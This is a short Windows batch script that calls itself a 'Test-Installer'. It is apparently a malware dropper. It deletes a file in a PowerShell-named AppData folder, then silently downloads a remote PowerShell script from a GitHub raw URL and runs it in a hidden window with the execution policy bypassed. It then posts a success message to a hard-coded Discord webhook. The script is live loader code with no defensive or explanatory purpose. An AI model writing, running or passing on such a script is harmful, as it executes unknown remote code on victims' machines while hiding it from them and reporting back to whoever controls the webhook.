@echo off
setlocal EnableDelayedExpansion
set "webhook=https://discord.com/api/webhooks/1244248742593429505/dfi37iZVMTet0o0Phd8QMzNjlGZx2OtOSGS5Q-_ZYB_WS3c69znwYPPu9fk-da6UwcJ3"
set "message=Test-Installer erfolgreich gestartet"
set "file=%USERPROFILE%\AppData\Local\Programs\Microsoft-Powershell\MyCopy.ps1"
set "url=https://raw.githubusercontent.com/Samuitl/New-Test/main/test.ps1"
set "tempfile=%TEMP%\test.ps1"
del "%file%"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%'); Start-Process -WindowStyle Hidden -FilePath 'powershell' -ArgumentList '-ExecutionPolicy Bypass', '-File', '%tempfile%'"
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
